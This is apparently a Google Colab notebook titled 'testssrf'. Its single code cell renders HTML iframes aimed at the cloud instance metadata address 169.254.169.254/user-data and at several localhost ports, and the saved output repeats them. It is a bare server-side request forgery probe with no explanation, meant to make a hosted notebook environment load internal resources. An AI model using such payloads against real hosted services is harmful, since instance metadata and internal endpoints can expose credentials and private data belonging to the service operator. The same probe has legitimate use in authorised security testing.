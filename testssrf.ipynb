{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "test.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyMM7ZBZQshpksqInn/56KOA",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/mflzkejxmglkzjefmlkgjzmlefxjkg/test/blob/master/testssrf.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6YbH8k5IJ1s_",
        "colab_type": "code",
        "outputId": "55040620-4af0-41e9-8661-02f80304bfab",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 175
        }
      },
      "source": [
        "from IPython.core.display import display, HTML\n",
        "\n",
        "display(HTML('''\n",
        "\n",
        "<iframe src=\"http://169.254.169.254/user-data\"></iframe>\n",
        "<iframe src=\"http://127.0.0.1\"></iframe>\n",
        "<iframe src=\"http://127.0.0.1:8080\"></iframe>\n",
        "<iframe src=\"https://127.0.0.1:443\"></iframe>\n",
        "'''))"
      ],
      "execution_count": 22,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "\n",
              "\n",
              "<iframe src=\"http://169.254.169.254/user-data\"></iframe>\n",
              "<iframe src=\"http://127.0.0.1\"></iframe>\n",
              "<iframe src=\"http://127.0.0.1:8080\"></iframe>\n",
              "<iframe src=\"https://127.0.0.1:443\"></iframe>\n"
            ],
            "text/plain": [
              "<IPython.core.display.HTML object>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    }
  ]
}